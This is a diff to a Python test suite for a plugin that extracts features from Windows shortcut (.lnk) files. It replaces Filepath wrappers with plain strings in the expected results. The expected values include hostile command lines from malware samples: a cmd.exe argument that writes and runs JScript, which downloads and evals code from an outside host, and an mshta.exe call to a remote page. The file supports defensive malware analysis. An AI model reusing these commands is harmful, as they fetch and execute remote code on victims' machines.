@@ -6,7 +6,7 @@ Lnk Shortcut test suite
 
 import datetime
 
-from azul_runner import FV, Event, Filepath, JobResult, State, test_template
+from azul_runner import FV, Event, JobResult, State, test_template
 
 from azul_plugin_shortcut.main import AzulPluginShortcut
 
@@ -35,7 +35,7 @@ class TestExecute(test_template.TestPlugin):
                     Event(
                         sha256="7ccb8a50afa675bcba87788d7364db5a037ba507cafbe3ec5c802563f4cb505a",
                         features={
-                            "link_base_path": [FV(Filepath("C:\\WINDOWS\\system32\\cmd.exe"))],
+                            "link_base_path": [FV("C:\\WINDOWS\\system32\\cmd.exe")],
                             "link_command_args": [
                                 FV(
                                     '/c echo. 2>k.js&echo var l = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");l.open("GET","http://load-the-attach.com/scr/scr",false);l.send^(^);var p = l.responseText;eval^(p^);>k.js&k.js'
@@ -54,11 +54,11 @@ class TestExecute(test_template.TestPlugin):
                                 FV("IsUnicode"),
                             ],
                             "link_icon_index": [FV(1)],
-                            "link_icon_location": [FV(Filepath("C:\\WINDOWS\\system32\\SHELL32.dll"))],
+                            "link_icon_location": [FV("C:\\WINDOWS\\system32\\SHELL32.dll")],
                             "link_info_drive_serial": [FV("0x685c785d")],
                             "link_info_drive_type": [FV("DRIVE_FIXED")],
                             "link_location": [FV("Local")],
-                            "link_relative_path": [FV(Filepath("..\\..\\..\\WINDOWS\\system32\\cmd.exe"))],
+                            "link_relative_path": [FV("..\\..\\..\\WINDOWS\\system32\\cmd.exe")],
                             "link_special_folder_id": [FV(37)],
                             "link_time_accessed": [
                                 FV(datetime.datetime(2016, 6, 22, 1, 15, 16, 396926, tzinfo=datetime.timezone.utc))
@@ -76,7 +76,7 @@ class TestExecute(test_template.TestPlugin):
                             "link_tracker_timestamp": [FV(datetime.datetime(2016, 4, 20, 16, 13, 35, 500004))],
                             "link_tracker_volume_id": [FV("A0FB13FA-60B9-4857-BAB0-C4EDCED1A216")],
                             "link_window_style": [FV("SW_SHOWMINNOACTIVE")],
-                            "link_working_dir": [FV(Filepath("%temp%"))],
+                            "link_working_dir": [FV("%temp%")],
                         },
                     )
                 ],
@@ -104,7 +104,7 @@ class TestExecute(test_template.TestPlugin):
                     Event(
                         sha256="2589167e23bc288f04c3bd3cf735c4df52bad4633d20c94ebaff12f99405eccd",
                         features={
-                            "link_base_path": [FV(Filepath("C:\\Windows\\System32\\mshta.exe"))],
+                            "link_base_path": [FV("C:\\Windows\\System32\\mshta.exe")],
                             "link_command_args": [FV("http://inform.bounceme.net/spool/index.html /f")],
                             "link_description": [FV("Shortcut Script")],
                             "link_file_flag": [FV("FILE_ATTRIBUTE_ARCHIVE")],
@@ -119,7 +119,7 @@ class TestExecute(test_template.TestPlugin):
                                 FV("IsUnicode"),
                             ],
                             "link_icon_index": [FV(114)],
-                            "link_icon_location": [FV(Filepath("%Windir%\\system32\\SHELL32.dll"))],
+                            "link_icon_location": [FV("%Windir%\\system32\\SHELL32.dll")],
                             "link_info_drive_serial": [FV("0xfc920caa")],
                             "link_info_drive_type": [FV("DRIVE_FIXED")],
                             "link_known_folder_id": [FV("1AC14E77-02E7-4E5D-B744-2EB1AE5198B7")],
@@ -143,7 +143,7 @@ class TestExecute(test_template.TestPlugin):
                             "link_tracker_timestamp": [FV(datetime.datetime(2020, 4, 17, 10, 38, 11, 500528))],
                             "link_tracker_volume_id": [FV("CFD08F68-5856-45C6-A160-AD62A58355C4")],
                             "link_window_style": [FV("SW_SHOWNORMAL")],
-                            "link_working_dir": [FV(Filepath("%WINDIR%\\System32\\"))],
+                            "link_working_dir": [FV("%WINDIR%\\System32\\")],
                         },
                     )
                 ],
